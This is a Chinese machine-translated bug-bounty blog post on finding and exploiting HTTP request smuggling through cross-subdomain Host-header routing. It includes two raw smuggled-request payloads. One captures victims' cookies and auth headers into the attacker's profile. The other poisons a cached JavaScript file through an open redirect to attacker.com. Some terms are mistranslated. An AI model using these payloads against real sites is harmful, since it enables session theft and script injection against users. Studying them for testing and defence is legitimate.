<html>
<head>
<title>Crossing The Borders : The illegal trade of HTTP requests</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">跨越边界:HTTP请求的非法交易</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/crossing-the-borders-the-illegal-trade-of-http-requests-57da188520ca?source=collection_archive---------0-----------------------#2019-12-25">https://infosecwriteups.com/crossing-the-borders-the-illegal-trade-of-http-requests-57da188520ca?source=collection_archive---------0-----------------------#2019-12-25</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9ed4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">TL；博士，这篇博客文章将是一系列文章中的第一篇，这些文章将介绍一些关于发现和利用http请求走私漏洞的技巧和诀窍。</strong></p><p id="ad06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个攻击载体最近由James Kettle (Albinowax)提出，在许多场合，他讨论了他能够用来攻击易受攻击的应用程序的不同技术，希望在这个系列中，我将介绍一些我在真实目标上测试时遇到的技术。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="kr ks di kt bf ku"><div class="gh gi kl"><img src="../Images/26a8d59deeddcad7288cfef4e91e3748.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bV7qz6dkFnj8rxWaF5Dc6g.png"/></div></div><figcaption class="kx ky gj gh gi kz la bd b be z dk translated">图片来自Portswigger.net</figcaption></figure><p id="b9f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">实现请求走私是相当复杂的，因为对于易受攻击的系统来说，必须存在某些条件才能被利用，我将稍后详细介绍，但现在请记住，成功检测并不一定意味着有保证的利用。</p><p id="94b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如James所解释的，这种攻击利用了系统的几个层(代理、负载平衡器……)之间的差异。前端和后端可能会以不同方式处理请求，一个系统可能会使用传输编码，而另一个系统会使用内容长度来处理请求，攻击者会简单地发送一个包含两个标头的操纵请求，第一个系统会按原样转发该请求，但第二个系统会认为它收到了两个不同的请求，并会等待请求结束，因此在此期间使用该应用程序的任何随机用户都会收到损坏/中毒的响应。</p></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><p id="8120" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">攻击分为两大类。CL和CL。TE，我不会讨论这两者之间的区别，但是请记住，这里讨论的技术可以应用于这两种情况。</p><p id="29ab" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一步是检测漏洞，漏洞可能存在于单个路径上，而不存在于其他路径上，因此这一步包括简单地探测每个主机和这些主机上的每个单个路径，这是因为在现代web应用程序中，路由可以使用主机头或路径来执行。在此步骤中，建议使用带有有效参数的有效POST请求，但如果不可能，请使用GET请求。詹姆斯已经为此建立了一个可靠的工具，几乎没有误报，所以做扫描应该不会太难。在一些情况下，我能够通过更改我的ip来发现主机上的请求走私。这主要发生在公司使用cloudflare或cloudfront时，结果表明一个系统易受攻击，而其他系统不会。这意味着我必须找到正确的来源ip来利用此漏洞，因此您也可以尝试找到不同的来源IP并扫描使用它们的主机。</p><p id="8414" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在有趣的部分，利用，这里我想讨论cdn中一个非常常见的行为，它发生在测试主机头注入时，例如一个有两个子域vuln.victim.io和api.victim.io的公司，如果您尝试在vuln.victim.io上使用主机头api.victim.io进行主机头注入，您会看到api.victim.io的内容。这在一些博客服务上也有效，这种行为本身是无害的，但随着请求走私，它变得非常重要，这意味着如果一个子域上存在请求走私，它可能会允许攻击者以其他主机为目标</p><p id="6a05" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一个实际的例子是这样的</p><pre class="km kn ko kp gt li lj lk ll aw lm bi"><span id="64ea" class="ln lo iq lj b gy lp lq l lr ls">POST / HTTP/1.1<br/>Host: vuln.victim.io<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 164<br/>Connection: keep-alive<br/>Transfer-Encoding: chunked</span><span id="5c5c" class="ln lo iq lj b gy lt lq l lr ls">9<br/>q=exploit<br/>0</span><span id="3929" class="ln lo iq lj b gy lt lq l lr ls">POST /personaldata HTTP/1.1<br/>Host: api.victim.io<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 300<br/>Cookie: MY_COOKIES<br/>Connection: close</span><span id="53cf" class="ln lo iq lj b gy lt lq l lr ls">bio=VICTIM REQUEST APPENDED HERE</span></pre><p id="6ed3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这种情况下，我别无选择，只能使用api主机将数据发布到我的个人资料中，vuln.victim.io上的任何用户请求都将被附加到我的请求中，系统将处理该请求并将整个请求(包括受害者cookies、auth头和csrf头)发布到我的个人资料中。</p><p id="74aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当试图滥用缓存和毒害javascript文件时，可以应用相同的逻辑，James讨论了为了执行这样的攻击，可以使用目录重定向+主机头注入将任何请求重定向到外部javascript文件，但是这种技术在某些配置上不起作用，因此通过利用前面讨论的行为，可以使用在另一台主机上找到的开放重定向</p><pre class="km kn ko kp gt li lj lk ll aw lm bi"><span id="f5a1" class="ln lo iq lj b gy lp lq l lr ls">POST /scripts/vendor.js HTTP/1.1<br/>Host: vuln.victim.io<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 164<br/>Connection: keep-alive<br/>Transfer-Encoding: chunked</span><span id="f5f2" class="ln lo iq lj b gy lt lq l lr ls">9<br/>q=exploit<br/>0</span><span id="5be2" class="ln lo iq lj b gy lt lq l lr ls">GET /?redir=https://attacker.com/malicious.js HTTP/1.1<br/>Host: blog.victim.io<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 300<br/>Cookie: MY_COOKIES<br/>Connection: close</span><span id="5555" class="ln lo iq lj b gy lt lq l lr ls">x=VICTIM REQUEST APPENDED HERE</span></pre><p id="5468" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在上面的例子中，blog.victim.io上存在一个打开的重定向，但是vuln.victim.io上存在请求走私，这允许我将javascript文件定位到vuln.victim.io上。</p><p id="76ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">每个案例和每个目标都是不同的，所以坚持下去，黑掉这个世界。</p></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><p id="76f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来源:</p><div class="lu lv gp gr lw lx"><a href="https://portswigger.net/web-security/request-smuggling" rel="noopener  ugc nofollow" target="_blank"><div class="ly ab fo"><div class="lz ab ma cl cj mb"><h2 class="bd ir gy z fp mc fr fs md fu fw ip bi translated">什么是HTTP请求走私？教程和示例</h2><div class="me l"><h3 class="bd b gy z fp mc fr fs md fu fw dk translated">在本节中，我们将解释HTTP请求走私攻击，并描述常见的请求走私漏洞…</h3></div><div class="mf l"><p class="bd b dl z fp mc fr fs md fu fw dk translated">portswigger.net</p></div></div><div class="mg l"><div class="mh l mi mj mk mg ml kv lx"/></div></div></a></div><div class="lu lv gp gr lw lx"><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn" rel="noopener  ugc nofollow" target="_blank"><div class="ly ab fo"><div class="lz ab ma cl cj mb"><h2 class="bd ir gy z fp mc fr fs md fu fw ip bi translated">HTTP Desync攻击:请求走私重生</h2><div class="me l"><h3 class="bd b gy z fp mc fr fs md fu fw dk translated">HTTP请求传统上被视为孤立的、独立的实体。在本文中，我将探索遗忘…</h3></div><div class="mf l"><p class="bd b dl z fp mc fr fs md fu fw dk translated">portswigger.net</p></div></div><div class="mg l"><div class="mm l mi mj mk mg ml kv lx"/></div></div></a></div></div><div class="ab cl lb lc hu ld" role="separator"><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg lh"/><span class="le bw bk lf lg"/></div><div class="ij ik il im in"><p id="45ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mn">关注</em> <a class="ae mo" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="mn"> Infosec报道</em> </a> <em class="mn">获取更多此类精彩报道。</em></p><div class="lu lv gp gr lw lx"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ly ab fo"><div class="lz ab ma cl cj mb"><h2 class="bd ir gy z fp mc fr fs md fu fw ip bi translated">信息安全报道</h2><div class="me l"><h3 class="bd b gy z fp mc fr fs md fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="mf l"><p class="bd b dl z fp mc fr fs md fu fw dk translated">medium.com</p></div></div><div class="mg l"><div class="mp l mi mj mk mg ml kv lx"/></div></div></a></div></div></div>    
</body>
</html>